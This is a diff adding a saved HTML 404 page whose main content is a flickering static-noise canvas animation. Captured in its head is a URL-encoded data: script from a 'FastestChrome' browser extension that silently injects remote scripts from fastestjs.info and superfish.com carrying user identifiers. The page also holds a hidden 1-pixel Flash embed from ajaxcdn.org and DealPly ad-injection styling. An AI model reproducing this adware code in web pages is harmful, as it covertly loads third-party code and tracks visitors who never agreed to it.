@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title></title>
+<style type="text/css">
+* {
+    margin: 0;
+    padding: 0;
+}
+
+html {
+    height: 100%;
+    overflow: hidden;
+}
+
+canvas {
+    z-index: 1;
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+}
+
+.caps {
+    z-index: 2;
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    /*
+    height: 100%;
+    */
+    opacity: 0;
+    -webkit-animation: as 3s linear infinite;
+    -moz-animation: asd 12s linear infinite;
+    -o-animation: asd 12s linear infinite;
+    animation: asd 12s linear infinite;
+}
+
+.caps img {
+    display: block;
+    width: 100%;
+    height: 100%;
+}
+
+@-webkit-keyframes as {
+    0% {
+        opacity: 0;
+    }
+    10% {
+        opacity: .3;
+    }
+    20% {
+        opacity: .1;
+    }
+    30% {
+        opacity: .5;
+    }
+    40% {
+        opacity: 0;
+    }
+    50% {
+        opacity: .8;
+    }
+    55% {
+        opacity: 0;
+    }
+    55% {
+        opacity: 0;
+    }
+}
+
+@-moz-keyframes as {
+    0% {
+        opacity: 0;
+    }
+    10% {
+        opacity: .3;
+    }
+    20% {
+        opacity: .1;
+    }
+    30% {
+        opacity: .5;
+    }
+    40% {
+        opacity: 0;
+    }
+    50% {
+        opacity: .8;
+    }
+    55% {
+        opacity: 0;
+    }
+    55% {
+        opacity: 0;
+    }
+}
+
+@-o-keyframes as {
+    0% {
+        opacity: 0;
+    }
+    10% {
+        opacity: .3;
+    }
+    20% {
+        opacity: .1;
+    }
+    30% {
+        opacity: .5;
+    }
+    40% {
+        opacity: 0;
+    }
+    50% {
+        opacity: .8;
+    }
+    55% {
+        opacity: 0;
+    }
+    55% {
+        opacity: 0;
+    }
+}
+
+@keyframes as {
+    0% {
+        opacity: 0;
+    }
+    10% {
+        opacity: .3;
+    }
+    20% {
+        opacity: .1;
+    }
+    30% {
+        opacity: .5;
+    }
+    40% {
+        opacity: 0;
+    }
+    50% {
+        opacity: .8;
+    }
+    55% {
+        opacity: 0;
+    }
+    55% {
+        opacity: 0;
+    }
+}
+
+.frame {
+    z-index: 3;
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background: -moz-radial-gradient(center, ellipse cover, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0) 19%, rgba(0, 0, 0, 0.9) 100%); /* FF3.6+ */
+    background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%, rgba(0, 0, 0, 0)), color-stop(19%, rgba(0, 0, 0, 0)), color-stop(100%, rgba(0, 0, 0, 0.9))); /* Chrome,Safari4+ */
+    background: -webkit-radial-gradient(center, ellipse cover, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0) 19%, rgba(0, 0, 0, 0.9) 100%); /* Chrome10+,Safari5.1+ */
+    background: -o-radial-gradient(center, ellipse cover, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0) 19%, rgba(0, 0, 0, 0.9) 100%); /* Opera 12+ */
+    background: -ms-radial-gradient(center, ellipse cover, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0) 19%, rgba(0, 0, 0, 0.9) 100%); /* IE10+ */
+    background: radial-gradient(ellipse at center, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0) 19%, rgba(0, 0, 0, 0.9) 100%); /* W3C */
+    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr = '#00000000', endColorstr = '#e6000000', GradientType = 1); /* IE6-9 fallback on horizontal gradient */
+
+}
+
+.frame div {
+    position: absolute;
+    left: 0;
+    top: -20%;
+    width: 100%;
+    height: 20%;
+    background-color: rgba(0, 0, 0, .12);
+    box-shadow: 0 0 10px rgba(0, 0, 0, .3);
+    -webkit-animation: asd 12s linear infinite;
+    -moz-animation: asd 12s linear infinite;
+    -o-animation: asd 12s linear infinite;
+    animation: asd 12s linear infinite;
+}
+
+.frame div:nth-child(1) {
+    -webkit-animation-delay: 0;
+    -moz-animation-delay: 0;
+    -o-animation-delay: 0;
+    animation-delay: 0;
+}
+
+.frame div:nth-child(2) {
+    -webkit-animation-delay: 4s;
+    -moz-animation-delay: 4s;
+    -o-animation-delay: 4s;
+    animation-delay: 4s;
+}
+
+.frame div:nth-child(3) {
+    -webkit-animation-delay: 8s;
+    -moz-animation-delay: 8s;
+    -o-animation-delay: 8s;
+    animation-delay: 8s;
+}
+
+@-webkit-keyframes asd {
+    0% {
+        top: -20%;
+    }
+    100% {
+        top: 100%;
+    }
+}
+
+@-moz-keyframes asd {
+    0% {
+        top: -20%;
+    }
+    100% {
+        top: 100%;
+    }
+}
+
+@-o-keyframes asd {
+    0% {
+        top: -20%;
+    }
+    100% {
+        top: 100%;
+    }
+}
+
+@keyframes asd {
+    0% {
+        top: -20%;
+    }
+    100% {
+        top: 100%;
+    }
+}
+
+h1 {
+    z-index: 3;
+    position: absolute;
+    font: bold 200px/200px Arial, sans-serif;
+    left: 50%;
+    top: 50%;
+    margin-top: -100px;
+    width: 100%;
+    margin-left: -50%;
+    height: 200px;
+    text-align: center;
+    color: transparent;
+    text-shadow: 0 0 30px rgba(0, 0, 0, .5);
+    -webkit-animation: asdd 2s linear infinite;
+    -moz-animation: asdd 2s linear infinite;
+    -o-animation: asdd 2s linear infinite;
+    animation: asdd 2s linear infinite;
+}
+
+@-webkit-keyframes asdd {
+    0% {
+        text-shadow: 0 0 30px rgba(0, 0, 0, .5);
+    }
+    33% {
+        text-shadow: 0 0 10px rgba(0, 0, 0, .4);
+    }
+    66% {
+        text-shadow: 0 0 20px rgba(0, 0, 0, .2);
+    }
+    100% {
+        text-shadow: 0 0 40px rgba(0, 0, 0, .8);
+    }
+}
+
+@-moz-keyframes asdd {
+    0% {
+        text-shadow: 0 0 30px rgba(0, 0, 0, .5);
+    }
+    33% {
+        text-shadow: 0 0 10px rgba(0, 0, 0, .4);
+    }
+    66% {
+        text-shadow: 0 0 20px rgba(0, 0, 0, .2);
+    }
+    100% {
+        text-shadow: 0 0 40px rgba(0, 0, 0, .8);
+    }
+}
+
+@-o-keyframes asdd {
+    0% {
+        text-shadow: 0 0 30px rgba(0, 0, 0, .5);
+    }
+    33% {
+        text-shadow: 0 0 10px rgba(0, 0, 0, .4);
+    }
+    66% {
+        text-shadow: 0 0 20px rgba(0, 0, 0, .2);
+    }
+    100% {
+        text-shadow: 0 0 40px rgba(0, 0, 0, .8);
+    }
+}
+
+@keyframes asdd {
+    0% {
+        text-shadow: 0 0 30px rgba(0, 0, 0, .5);
+    }
+    33% {
+        text-shadow: 0 0 10px rgba(0, 0, 0, .4);
+    }
+    66% {
+        text-shadow: 0 0 20px rgba(0, 0, 0, .2);
+    }
+    100% {
+        text-shadow: 0 0 40px rgba(0, 0, 0, .8);
+    }
+}
+</style>
+<link type="text/css" rel="stylesheet" href="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/style.css">
+    <script src="./assets_files/jquery.min.js"></script>
+    <script type="text/javascript" charset="utf-8" src="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/page_context.js"></script>
+    <style id="wrc-middle-css" type="text/css">.wrc_whole_window{	display: none;	position: fixed; 	z-index: 2147483647;	background-color: rgba(40, 40, 40, 0.9);	word-spacing: normal !important;	margin: 0px !important;	padding: 0px !important;	border: 0px !important;	left: 0px;	top: 0px;	width: 100%;	height: 100%;	line-height: normal !important;	letter-spacing: normal !important;	overflow: hidden;}.wrc_bar_window{	display: none;	position: fixed; 	z-index: 2147483647;	background-color: rgba(60, 60, 60, 1.0);	word-spacing: normal !important;	font-family: Segoe UI, Arial Unicode MS, Arial, Sans-Serif;	margin: 0px !important;	padding: 0px !important;	border: 0px !important;	left: 0px;	top: 0px;	width: 100%;	height: 40px;	line-height: normal !important;	letter-spacing: normal !important;	color: white !important;	font-size: 13px !important;}.wrc_middle {	display: table-cell;	vertical-align: middle;	width: 100%;}.wrc_middle_main {	font-family: Segoe UI, Arial Unicode MS, Arial, Sans-Serif;	font-size: 14px;	width: 600px;	height: auto;    background: url(chrome-extension://icmlaeflemplmjndnaapfdbbnpncnbda/skin/images/background-body.jpg) repeat-x left top;	background-color: rgb(39, 53, 62);	position: relative;	margin-left: auto;	margin-right: auto;	text-align: left;}.wrc_middle_tq_main {	font-family: Segoe UI, Arial Unicode MS, Arial, Sans-Serif;	font-size: 16px;	width: 615px;	height: 460px;    background: url(chrome-extension://icmlaeflemplmjndnaapfdbbnpncnbda/skin/images/background-sitecorrect.png) no-repeat;	background-color: white;	color: black !important;	position: relative;	margin-left: auto;	margin-right: auto;	text-align: center;}.wrc_middle_logo {    background: url(chrome-extension://icmlaeflemplmjndnaapfdbbnpncnbda/skin/images/logo.jpg) no-repeat left bottom;    width: 140px;    height: 42px;    color: orange;    display: table-cell;    text-align: right;    vertical-align: middle;}.wrc_icon_warning {	margin: 20px 10px 20px 15px;	float: left;	background-color: transparent;}.wrc_middle_title {    color: #b6bec7;	height: auto;    margin: 0px auto;	font-size: 2.2em;	white-space: nowrap;	text-align: center;}.wrc_middle_hline {    height: 2px;	width: 100%;    display: block;}.wrc_middle_description {	text-align: center;	margin: 15px;	font-size: 1.4em;	padding: 20px;	height: auto;	color: white;	min-height: 3.5em;}.wrc_middle_actions_main_div {	margin-bottom: 15px;	text-align: center;}.wrc_middle_actions_blue_button div {	display: inline-block;	width: auto;	cursor: Pointer;	margin: 3px 10px 3px 10px;	color: white;	font-size: 1.2em;	font-weight: bold;}.wrc_middle_actions_blue_button {	-moz-appearance: none;	border-radius: 7px;	-moz-border-radius: 7px/7px;	border-radius: 7px/7px;	background-color: rgb(0, 173, 223) !important;	display: inline-block;	width: auto;	cursor: Pointer;	border: 2px solid #00dddd;	padding: 0px 20px 0px 20px;}.wrc_middle_actions_blue_button:hover {	background-color: rgb(0, 159, 212) !important;}.wrc_middle_actions_blue_button:active {	background-color: rgb(0, 146, 200) !important;	border: 2px solid #00aaaa;}.wrc_middle_actions_grey_button div {	display: inline-block;	width: auto;	cursor: Pointer;	margin: 3px 10px 3px 10px;	color: white !important;	font-size: 15px;	font-weight: bold;}.wrc_middle_actions_grey_button {	-moz-appearance: none;	border-radius: 7px;	-moz-border-radius: 7px/7px;	border-radius: 7px/7px;	background-color: rgb(100, 100, 100) !important;	display: inline-block;	width: auto;	cursor: Pointer;	border: 2px solid #aaaaaa;	text-decoration: none;	padding: 0px 20px 0px 20px;}.wrc_middle_actions_grey_button:hover {	background-color: rgb(120, 120, 120) !important;}.wrc_middle_actions_grey_button:active {	background-color: rgb(130, 130, 130) !important;	border: 2px solid #00aaaa;}.wrc_middle_action_low {	font-size: 0.9em;	white-space: nowrap;	cursor: Pointer;	color: grey !important;	margin: 10px 10px 0px 10px;	text-decoration: none;}.wrc_middle_action_low:hover {	color: #aa4400 !important;}.wrc_middle_actions_rest_div {	padding-top: 5px;	white-space: nowrap;	text-align: center;}.wrc_middle_action {	white-space: nowrap;	cursor: Pointer;	color: red !important;	font-size: 1.2em;	margin: 10px 10px 0px 10px;	text-decoration: none;}.wrc_middle_action:hover {	color: #aa4400 !important;}</style><script id="wrc-script-middle_window" type="text/javascript" language="JavaScript">var g_inputsCnt = 0;var g_InputThis = new Array(null, null, null, null);var g_alerted = false;/* we test the input if it includes 4 digits   (input is a part of 4 inputs for filling the credit-card number)*/function is4DigitsCardNumber(val){	var regExp = new RegExp('[0-9]{4}');	return (val.length == 4 && val.search(regExp) == 0);}/* testing the whole credit-card number 19 digits devided by three '-' symbols or   exactly 16 digits without any dividers*/function isCreditCardNumber(val){	if(val.length == 19)	{		var regExp = new RegExp('[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}');		return (val.search(regExp) == 0);	}	else if(val.length == 16)	{		var regExp = new RegExp('[0-9]{4}[0-9]{4}[0-9]{4}[0-9]{4}');		return (val.search(regExp) == 0);	}	return false;}function CheckInputOnCreditNumber(self){	if(g_alerted)		return false;	var value = self.value;	if(self.type == 'text')	{		if(is4DigitsCardNumber(value))		{			var cont = true;			for(i = 0; i < g_inputsCnt; i++)				if(g_InputThis[i] == self)					cont = false;			if(cont && g_inputsCnt < 4)			{				g_InputThis[g_inputsCnt] = self;				g_inputsCnt++;			}		}		g_alerted = (g_inputsCnt == 4);		if(g_alerted)			g_inputsCnt = 0;		else			g_alerted = isCreditCardNumber(value);	}	return g_alerted;}function CheckInputOnPassword(self){	if(g_alerted)		return false;	var value = self.value;	if(self.type == 'password')	{		g_alerted = (value.length > 0);	}	return g_alerted;}function onInputBlur(self, bRatingOk, bFishingSite){	var bCreditNumber = CheckInputOnCreditNumber(self);	var bPassword = CheckInputOnPassword(self);	if((!bRatingOk || bFishingSite == 1) && (bCreditNumber || bPassword) )	{		var warnDiv = document.getElementById("wrcinputdiv");		if(warnDiv)		{			/* show the warning div in the middle of the screen */			warnDiv.style.left = "0px";			warnDiv.style.top = "0px";			warnDiv.style.width = "100%";			warnDiv.style.height = "100%";			document.getElementById("wrc_warn_fs").style.display = 'none';			document.getElementById("wrc_warn_cn").style.display = 'none';			if(bFishingSite)				document.getElementById("wrc_warn_fs").style.display = 'block';			else				document.getElementById("wrc_warn_cn").style.display = 'block';			warnDiv.style.display = 'table';		}	}}</script><style type="text/css">iframe.dealply-toast { right: -99999px !important; }iframe.dealply-toast.fastestext-revealed { right: 0px !important; }</style><script type="text/javascript" src="./assets_files/javascript.js"></script><script type="text/javascript" src="data:text/javascript,%0D%0A(function()%7B%0D%0A%20%20%20%20var%20install_source%20%3D%20'Chrome%20Webstore'%3B%0D%0A%20%20%20%20var%20ext_name%20%3D%20'FastestChrome'%3B%0D%0A%20%20%20%20var%20install_time%20%3D%20'1363600457644'%3B%0D%0A%20%20%20%20var%20add_related_deals_pref%20%3D%20'false'%3B%0D%0A%20%20%20%20var%20ctid%20%3D%20'1_2013-03'%3B%0D%0A%0D%0A%20%20%20%20if(window!%3Dwindow.top)return%3Bvar%20blacklist%3D%5B%2Fveetle.com%2F%2C%2F1800flowers.com%2F%2C%2Fdominos.com%2F%2C%2Fsquidoo.com%2F%2C%2Fnytimes.com%2F%2C%2Fdeveloper.apple.com%2F%2C%2Fhotmail.com%2F%2C%2Fnfl.com%2F%2C%2Fgrooveshark.com%2F%2Cnew%20RegExp(%22www.google.com%2Freader%22)%2C%2Fpandora.com%2F%2C%2Freddit.com%2F%2C%2Freuters.com%2F%2C%2Farstechnica.com%2F%2C%2Fcbslocal.com%2F%2C%2Fvice.com%2F%2C%2Fonline.wsj.com%2F%2C%2F.*live.com%2F%2C%2F.*battlefield.com%2F%2C%2Fpch.com%2F%5D%3Bfor(var%20i%3D0%3Bi%3Cblacklist.length%3Bi%2B%2B)if(blacklist%5Bi%5D.test(document.location.href))return%3Bvar%20hashCode%3Dfunction(a)%7Bvar%20b%3D0%3Bfor(var%20c%3D0%3Bc%3Ca.length%3Bc%2B%2B)%7Bb%3D((b%3C%3C5)-b)%2Ba.charCodeAt(c)%3Bb%3Db%26b%3B%7Dreturn%20b%3B%7D%3Bvar%20ready%3Dfunction(a)%7Bvar%20b%3Dfunction()%7Bif(window.document.body)a()%3Belse%20setTimeout(b%2C100)%3B%7D%3Bb()%3B%7D%3Bready(function()%7BsetTimeout(function()%7Bif(%2F%5Ehttp%3A%2F.test(document.location.href)%7C%7Cnew%20RegExp(%22%5Ehttps%3A%2F%2Fwww.google.com%22).test(document.location.href))%7Bvar%20a%3Dfunction(a)%7Bvar%20b%3Ddocument.createElement('script')%3Bb.type%3D'text%2Fjavascript'%3Bb.src%3Da%3Bdocument.getElementsByTagName('head')%5B0%5D.appendChild(b)%3B%7D%3Bvar%20b%3Dfunction(b)%7Bif(add_related_deals_pref%3D%3D'None'%7C%7Cadd_related_deals_pref%3D%3D'true')a('http%3A%2F%2Fi.fastestjs.info%2Ffast%2Fjavascript.js%3Fchannel%3D'%2Bb)%3B%7D%3Bvar%20c%3Dfunction(b%2Cc)%7Ba(%22https%3A%2F%2Fwww.superfish.com%2Fws%2Fsf_conduit.jsp%3Fdlsource%3D%22%2Bb%2B%22%26CTID%3D%22%2Bc%2B%22%26userId%3D%22%2B%22fastest00_%22%2Bb%2B%22_%22%2Bc%2B'_')%3B%7D%3Bvar%20d%3Dnavigator.browserLanguage%7C%7Cnavigator.language%3Bvar%20e%3D%22fastestchrome%22%3Bif(%2FChrome%2F.test(navigator.userAgent))if(ext_name%3D%3D%22Fastanium%22)e%3D%22fastanium%22%3Belse%20e%3D%22fastestchrome%22%3Belse%20if(%2FFirefox%2F.test(navigator.userAgent))e%3D%22fastestfox%22%3Belse%20if(%2FSafari%2F.test(navigator.userAgent))e%3D%22fastestsafari%22%3Belse%20if(%2FTrident%2F.test(navigator.userAgent))e%3D%22fastestie%22%3Bvar%20f%3DMath.abs(hashCode(install_time))%3Bc(e%2Cctid)%3B%7D%7D%2C500)%3B%7D)%3B%0D%0A%7D())%3B%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A"></script><script src="./assets_files/opt_content.js"></script><script type="text/javascript" src="./assets_files/sf_conduit.jsp"></script><script type="text/javascript" src="./assets_files/sf_code.jsp"></script><script type="text/javascript" src="./assets_files/base_single_icon.js"></script><script type="text/javascript" src="./assets_files/dojo.xd.js"></script><script type="text/javascript" charset="utf-8" src="./assets_files/script.xd.js"></script><script type="text/javascript" charset="utf-8" src="./assets_files/window.xd.js"></script><script type="text/javascript" src="./assets_files/getSupportedSitesJSON.action" id="sufioIoScript1" charset="utf-8"></script><script type="text/javascript" src="./assets_files/getCouponsSupportedSites.action" id="sufioIoScript2" charset="utf-8"></script></head>
+<body screen_capture_injected="true">
+
+<h1 class="broke-endless-pages">404</h1>
+
+<div class="frame">
+    <div></div>
+    <div></div>
+    <div></div>
+</div>
+<div class="caps"><img src="./assets_files/caps.png" alt=""></div>
+<canvas id="canvas" width="700" height="500"></canvas>
+
+<script type="text/javascript">
+    var Application = ( function () {
+        var canvas;
+        var ctx;
+        var imgData;
+        var pix;
+        var WIDTH;
+        var HEIGHT;
+        var flickerInterval;
+
+        var init = function () {
+            canvas = document.getElementById('canvas');
+            ctx = canvas.getContext('2d');
+            canvas.width = WIDTH = 700;
+            canvas.height = HEIGHT = 500;
+            ctx.fillStyle = 'white';
+            ctx.fillRect(0, 0, WIDTH, HEIGHT);
+            ctx.fill();
+            imgData = ctx.getImageData(0, 0, WIDTH, HEIGHT);
+            pix = imgData.data;
+            flickerInterval = setInterval(flickering, 30);
+        };
+
+        var flickering = function () {
+            for (var i = 0; i < pix.length; i += 4) {
+                var color = (Math.random() * 255) + 50;
+                pix[i] = color;
+                pix[i + 1] = color;
+                pix[i + 2] = color;
+            }
+            ctx.putImageData(imgData, 0, 0);
+        };
+
+        return {
+            init: init
+        };
+    }());
+
+    Application.init();
+</script>
+
+<div id="dp_swf_engine" style="position: absolute; width: 1px; height: 1px;"><embed style="width: 1px; height: 1px;" type="application/x-shockwave-flash" src="http://www.ajaxcdn.org/swf.swf" width="1" height="1" id="_dp_swf_engine" name="_dp_swf_engine" bgcolor="#336699" quality="high" allowscriptaccess="always"></div><sfmsg id="sfMsgId" data="{&quot;imageCount&quot;:0,&quot;ip&quot;:&quot;1.1.1.1&quot;}"></sfmsg></body></html>
